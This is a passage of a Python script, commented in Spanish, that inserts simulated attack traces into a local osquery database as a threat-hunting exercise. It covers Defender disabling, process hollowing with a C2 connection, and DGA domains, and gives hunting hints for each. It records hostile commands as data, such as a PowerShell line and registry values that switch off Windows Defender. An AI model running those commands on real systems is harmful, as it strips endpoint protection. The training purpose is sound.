    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_disable, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true ...",
         8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", t, 0))
    
    c.execute("INSERT INTO registry VALUES (?,?,?,?,?)",
        (r"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender",
         "DisableAntiSpyware", "REG_DWORD", "1", t))
    c.execute("INSERT INTO registry VALUES (?,?,?,?,?)",
        (r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection",
         "DisableRealtimeMonitoring", "REG_DWORD", "1", t))
    
    conn.commit()
    print(f"\n[!] ATAQUE SIMULADO: Disable Windows Defender")
    print(f"    Proceso PID: {pid_disable}")
    print(f"    Acciones: DisableRealtimeMonitoring + DisableIOAVProtection + DisableAntiSpyware")
    print(f"\n[*] PISTAS PARA HUNTING:")
    print(f"    1. Buscar Set-MpPreference en cmdline")
    print(f"    2. Buscar registry con DisableAntiSpyware o DisableRealtimeMonitoring")
    print(f"    3. Detectar modificaciones en HKLM\\...\\Windows Defender")
    print(f"    4. Correlacionar timestamp con otros eventos de ataque")


def simulate_process_hollowing(conn):
    """Simula process hollowing"""
    c = conn.cursor()
    t = now()
    pid_hollow = random.randint(26000, 26999)
    
    # svchost.exe "legítimo" pero con comportamiento anómalo
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_hollow, "svchost.exe", r"C:\Windows\System32\svchost.exe",
         "svchost.exe",  # cmdline vacío/simple = sospechoso para svchost
         2400, 1001, 1001, t, 262144, 0, 15, 0, "R"))  # parent=explorer (WRONG), high memory
    
    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_hollow, r"C:\Windows\System32\svchost.exe", "svchost.exe",
         2400, r"C:\Windows\explorer.exe", "exec", t, 1001))
    
    # Conexión C2 desde svchost "hollowed"
    c.execute("INSERT INTO process_open_sockets VALUES (?,?,?,?,?,?,?,?,?,?)",
        (pid_hollow, 100, 1000, 2, 6, "10.0.1.50", random.randint(50000, 60000),
         "91.219.236.222", 443, "ESTABLISHED"))
    
    conn.commit()
    print(f"\n[!] ATAQUE SIMULADO: Process Hollowing")
    print(f"    Proceso hollowed PID: {pid_hollow}")
    print(f"    Imagen: svchost.exe (legítima)")
    print(f"    ANOMALÍAS:")
    print(f"      - Parent: explorer.exe (debería ser services.exe)")
    print(f"      - UID: 1001 (debería ser SYSTEM)")
    print(f"      - Sin -k flag en cmdline")
    print(f"      - Memoria residente: 256KB (anormalmente alto)")
    print(f"      - Conexión a IP externa")
    print(f"\n[*] PISTAS PARA HUNTING:")
    print(f"    1. Buscar svchost.exe con parent != services.exe (PID 800)")
    print(f"    2. Buscar svchost.exe sin '-k' en cmdline")
    print(f"    3. Buscar svchost.exe corriendo como usuario (no SYSTEM)")
    print(f"    4. Detectar svchost con conexiones a IPs externas")


def simulate_dga_communication(conn):
    """Simula comunicación DGA"""
    c = conn.cursor()
    t = now()
    
    # Generar dominios DGA
    dga_domains = []
    for i in range(15):
        chars = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(8, 16)))
        tld = random.choice(['.com', '.net', '.org', '.xyz', '.top'])
        dga_domains.append(chars + tld)
    
    for i, domain in enumerate(dga_domains):
        c.execute("INSERT INTO dns_cache VALUES (?,?,?,?,?)",
            (domain, "A", f"198.51.100.{random.randint(1, 254)}", 60, t + i*5))
    
    conn.commit()
    print(f"\n[!] ATAQUE SIMULADO: DGA Communication")
    print(f"    Dominios DGA generados: {len(dga_domains)}")
    print(f"    Ejemplos: {dga_domains[0]}, {dga_domains[1]}, {dga_domains[2]}")
    print(f"    Todos resuelven a rango 198.51.100.0/24")
    print(f"\n[*] PISTAS PARA HUNTING:")
    print(f"    1. Buscar en dns_cache dominios con alta entropía (nombres aleatorios)")
    print(f"    2. Buscar múltiples dominios que resuelven al mismo rango IP")
    print(f"    3. Detectar dominios con TLDs baratos (.xyz, .top)")
    print(f"    4. Buscar ráfagas de queries DNS en corto período")


# Dispatch table
DISPATCH = {
    "dll_injection": simulate_dll_injection,
    "ransomware": simulate_ransomware,
    "credential_dump": simulate_credential_dump,
    "reverse_shell": simulate_reverse_shell,
    "lateral_movement": simulate_lateral_movement,
    "persistence_registry": simulate_persistence_registry,
    "persistence_schtask": simulate_persistence_schtask,
    "lolbin_certutil": simulate_lolbin_certutil,
    "lolbin_mshta": simulate_lolbin_mshta,
    "lolbin_wmic": simulate_lolbin_wmic,
    "data_exfiltration": simulate_data_exfiltration,
    "fileless_powershell": simulate_fileless_powershell,
    "defender_disable": simulate_defender_disable,
    "process_hollowing": simulate_process_hollowing,
    "dga_communication": simulate_dga_communication,
}


def reset_db():
    """Regenera la base de datos desde cero"""
    import os
    if os.path.exists(DB_PATH):
        os.remove(DB_PATH)
    import importlib.util
    spec = importlib.util.spec_from_file_location("gen", "/app/generate_osquery_db.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    mod.main()
    print("\n[+] Base de datos reiniciada al estado original")


def list_scenarios():
    """Lista todos los escenarios disponibles"""
    print("\n" + "="*70)
    print(" ESCENARIOS DE ATAQUE DISPONIBLES")
    print("="*70)
    for key, info in SCENARIOS.items():
        print(f"\n  simulate {key}")
        print(f"    {info['name']}")
        print(f"    {info['description']}")
        print(f"    MITRE: {info['mitre']}")
    print(f"\n{'='*70}")
    print(f"  simulate list   - Muestra esta lista")
    print(f"  simulate reset  - Reinicia la BD al estado original")
    print(f"  simulate all    - Ejecuta TODOS los escenarios")
    print(f"{'='*70}\n")


def main():
    if len(sys.argv) < 2:
        list_scenarios()
        return
    
    scenario = sys.argv[1].lower()
    
    if scenario == "list":
        list_scenarios()
        return
    
    if scenario == "reset":
        reset_db()
        return
    
    if scenario == "all":
        conn = sqlite3.connect(DB_PATH)
        for key, func in DISPATCH.items():
            func(conn)
            print()
        conn.close()
        print("\n[+] Todos los escenarios ejecutados. La BD ahora contiene TODOS los indicadores.")
        return
    
    if scenario not in DISPATCH:
        print(f"[!] Escenario '{scenario}' no encontrado.")
        print(f"    Usa 'simulate list' para ver los disponibles.")
        return
    
    conn = sqlite3.connect(DB_PATH)
    DISPATCH[scenario](conn)
    conn.close()
    print(f"\n[+] Evento insertado en la BD. Usa 'osqueryi' para detectarlo.")


if __name__ == "__main__":
    main()
